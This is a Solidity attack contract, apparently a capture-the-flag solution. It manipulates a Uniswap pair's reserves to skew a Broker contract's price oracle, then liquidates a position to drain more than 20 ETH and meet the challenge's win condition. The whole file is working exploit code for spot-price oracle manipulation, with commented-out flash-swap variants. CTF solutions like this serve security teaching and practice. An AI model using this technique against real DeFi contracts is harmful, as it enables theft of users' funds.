pragma solidity 0.8.0;

import "./Broker.sol";
import "./Setup.sol";
import "hardhat/console.sol";

contract BrokerAttacker {
    Setup public setup;
    IUniswapV2Pair public pair;
    WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Token public token;
    Broker public broker;

    constructor (Setup _setup) {
        setup = _setup;
        pair = _setup.pair();
        token = _setup.token();
        broker = _setup.broker();
    }

    function attack() external payable {
      weth.deposit{value: msg.value}();

      // skew the uniswap ratio by buying lots of tokens
      // we're heavily overpaying in ETH but we don't care
      weth.transfer(address(pair), weth.balanceOf(address(this)));
      bytes memory payload;
      pair.swap(450_000 * 1 ether, 0, address(this), payload);

      uint256 rate = broker.rate();
      console.log("skewed broker rate: %s", rate);

      token.approve(address(broker), type(uint256).max);
      // 25 ETH in broker, win condition is < 5 ETH, so withdraw > 20 ETH
      uint256 liqAmount = 21 ether * rate;
      broker.liquidate(address(setup), liqAmount);

      require(setup.isSolved(), "!solved");

      // I wanted to take a Uniswap flash swap first but they reserves
      // are not yet updated in the callback, so rate() is still the same
      // https://uniswap.org/docs/v2/smart-contract-integration/using-flash-swaps/
      // payload = new bytes(1); // we don't care about the data, just make it run our uniswapV2Call
      // (uint112 _reserveToken, uint112 _reserveWeth,) = pair.getReserves();
      // console.log("reserves %s %s", _reserveToken, _reserveWeth);
      // pair.swap(_reserveToken - _reserveWeth, 0, address(this), payload);
    }

    // function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
    //   console.log("uniswap called");
    //   console.log("rate %s", broker.rate());
    //   (uint112 _reserveToken, uint112 _reserveWeth,) = pair.getReserves();
    //   console.log("reserves %s %s", _reserveToken, _reserveWeth);
    //   token.transfer(address(pair), token.balanceOf(address(this)));
    // }
}
